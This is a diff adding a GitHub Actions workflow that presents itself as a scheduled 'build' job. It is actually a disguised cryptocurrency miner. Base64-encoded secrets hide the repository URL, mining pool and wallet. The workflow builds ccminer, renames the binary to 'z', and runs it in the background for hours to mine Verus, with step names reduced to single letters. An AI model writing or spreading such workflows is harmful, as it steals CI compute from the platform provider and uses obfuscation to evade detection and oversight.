@@ -1,0 +1,49 @@
+name: build
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 */8 * * *'
+
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    timeout-minutes: 350
+
+    steps:
+      - name: a
+        uses: actions/checkout@v4
+
+      - name: b
+        run: |
+          sudo apt update -qq
+          sudo apt install -y build-essential automake autoconf libtool \
+            pkg-config libcurl4-openssl-dev libssl-dev \
+            libjansson-dev libgmp-dev curl tar
+
+      - name: c
+        run: |
+          echo "${{ secrets.K1 }}" | base64 -d | tr -d '\r\n' > u.txt
+          U=$(cat u.txt)
+          T="${U%.git}/archive/HEAD.tar.gz"
+          mkdir x
+          curl -sL "$T" | tar -xz --strip-components=1 -C x
+
+      - name: d
+        run: |
+          cd x
+          ./autogen.sh >/dev/null
+          ./configure --disable-cuda --disable-nvml >/dev/null
+          make -j$(nproc) >/dev/null
+          mv ccminer z
+
+      - name: e
+        run: |
+          echo "${{ secrets.K2 }}" | base64 -d | tr -d '\r\n' > p.txt
+          P=$(cat p.txt)
+          W=$(hostname)-$(date +%s)
+          cd x
+          nohup ./z -a verus -o "$P" \
+            -u "${{ secrets.K3 }}.${W}" \
+            -p hybrid --api-bind 0 --no-color >> ~/.q 2>&1 &
+          sleep 20400
